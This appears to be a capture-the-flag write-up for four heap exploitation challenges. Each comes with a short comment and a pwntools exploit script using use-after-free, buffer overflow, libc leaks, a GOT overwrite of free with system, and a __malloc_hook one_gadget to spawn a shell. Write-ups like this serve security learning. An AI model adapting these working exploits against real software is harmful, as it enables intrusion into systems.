DONTOVERFLOWME
===========================

General overview of problems faced
-------------------------------------
Buffer overflow + Use after me -> led me down a rabbit hole because I initially thought you had to double free.

Script/Command used
------------------
```python
def exploit():
    make_clone(0, b'')
    payload = b'A'*8 + p64(E.symbols['win'])
    name_clone(0, payload)
    P.sendline()
    give_hint(0)
    P.interactive()
```

EZPZ1
===========================

General overview of problems faced
-------------------------------------
None. Straightforward enough - you can still set question even if free so there is a use after free.

Script/Command used
------------------
```python

def exploit():
    create()
    delete(b'0')
    create()
    set(b'1', p64(E.symbols['win']))
    ask(b'0')
    P.interactive()

```

EZPZ2
===========================

General overview of problems faced
-------------------------------------
Can manipulate heap to leak a libc address and overwrite free function with system. Rather tricky to debug and prevent program from crashing but chaining call to a safe, benign function like putchar seemed to do the trick.

Script/Command used
------------------
```python

def exploit():
    libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
    got_printf = E.got['printf']
    libc_printf = libc.symbols['printf']
    libc.address = got_printf - libc_printf
    system = libc.symbols['system']

    create() # 0
    set(b'0', b'/bin/sh\0')
    create() # 1
    create() # 2
    create() # 3
    create() # 4
    delete(b'3')
    delete(b'4')
    set(b'3', p64(0x0) + b'A' * 32 + p64(0x31) + p64(E.got['atoi']))
    create() # 5
    leak = ask(b'5')
    log.info(f'ATOI @ {hex(leak)}')
    LIBC.address = leak - LIBC.symbols['atoi'] # set libc base
    delete(b'2')
    set(b'1', p64(0x0) + b'A' * 32 + p64(0x31) + p64(E.got['free'] - 8))
    create() # 6
    before_free = ask(b'6')
    log.info(f'before free @ {hex(before_free)}')
    set(b'6', p64(before_free) + p64(LIBC.symbols['system']) + p64(LIBC.symbols['putchar']))
    delete(b'0')
    P.interactive()

```

NOTEZPZ
===========================

General overview of problems faced
-------------------------------------
Literally everything - ensuring correct alignments was definitely something I had to play around a lot with this one.

Script/Command used
------------------
```python

def exploit():
    for _ in range(16 + 5):
        create()
    for i in range(5):
        delete(f'{16 + i}'.encode())
    delete(b'20')
    create() # 21
    heap_address = ask(b'21')
    log.info(f'Leaked Heap Address @ {hex(heap_address)}')
    set(b'2', b'A' * 40 + p64(0x421))
    delete(b'3')
    set(b'15', b'A' * 40 + p64(0x31) + p64(heap_address - 0x5d0))
    for _ in range(3):
        create()
    libc_leak = ask(b'24')
    log.info(f'Leaked LIBC Address @ {hex(libc_leak)}')
    LIBC.address = libc_leak - 0x1ecbe0
    one_gadget = LIBC.address + 0xe3b01
    delete(b'1')
    set(b'0', b'A' * 40 + p64(0x31) + p64(LIBC.symbols['__malloc_hook']))
    create() # 25
    set(b'25', p64(one_gadget))
    create()

    P.interactive()

```
